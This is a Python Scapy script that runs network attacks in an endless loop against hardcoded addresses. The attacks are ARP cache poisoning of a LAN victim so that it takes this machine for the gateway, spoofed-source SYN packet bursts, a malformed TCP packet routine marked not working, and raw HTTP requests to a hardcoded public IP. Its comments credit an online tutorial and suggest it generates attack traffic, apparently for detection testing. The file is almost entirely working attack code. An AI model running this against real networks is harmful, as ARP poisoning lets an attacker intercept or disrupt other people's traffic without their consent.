from scapy.all import *
from scapy.layers.inet import IP, TCP
from scapy.layers import http
import argparse
import time
import os
import sys

# Source : https://www.thepythoncode.com/article/building-arp-spoofer-using-scapy
# This file generate some attack :
# ARP spoofing

def get_mac(ip):
    """
    Returns MAC address of any device connected to the network
    If ip is down, returns None instead
    """
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src

def spoof(target_ip, host_ip, verbose=True):
    """
    Spoofs `target_ip` saying that we are `host_ip`.
    it is accomplished by changing the ARP cache of the target (poisoning)
    """
    print("Spoofing Attack")
    time.sleep(1)
    # get the mac address of the target
    target_mac = get_mac(target_ip)
    # craft the arp 'is-at' operation packet, in other words; an ARP response
    # we don't specify 'hwsrc' (source MAC address)
    # because by default, 'hwsrc' is the real MAC address of the sender (ours)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # send the packet
    # verbose = 0 means that we send the packet without printing any thing
    send(arp_response, verbose=0)
    if verbose:
        # get the MAC address of the default interface we are using
        self_mac = ARP().hwsrc
        print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))

# malformed packet attack
def single_packet_attack(target):
    print("single_packet_attack")
    time.sleep(1)
    # Craft a TCP packet with the PAU flag set
    packet = IP(dst=target)/TCP(dport=80, flags='PAU')
    # Send the packet
    send(packet, verbose=0)
    time.sleep(4)

# Brute force attack
def spam_attack(target):
    print("Brute force attack")
    time.sleep(1)
    for i in range(50):
        pkt = IP(src="192.168.0.1", dst=target)/TCP(flags="S")
        send(pkt, verbose=0)
        time.sleep(0.1)

def bad_url_http_request():
    print("bad_url_http_request")
    time.sleep(1)
    # Create GET request packet
    get_request = b"GET / HTTP/1.1\r\nHost: 89.159.196.94\r\n\r\n"
    pkt = IP(dst="89.159.196.94") / TCP(dport=80) / Raw(load=get_request)

    # Send packet and receive response
    response = sr1(pkt, verbose=0)

if __name__ == "__main__":
    # victim ip address
    target = "192.168.1.95"
    # gateway ip address
    host = "192.168.1.254"
    # print progress to the screen
    verbose = True
    # enable ip forwarding
    #enable_ip_route()
    while True:
        # attack single packet
        #TODO not working
        #single_packet_attack(target)
        
        # telling the `target` that we are the `host`
        # ARP poisonning
        spoof(target, host, verbose)
        
        # Brute for simulating
        spam_attack(target)

        # Bas request simulating
        bad_url_http_request()

        # sleep for one second
        time.sleep(5)
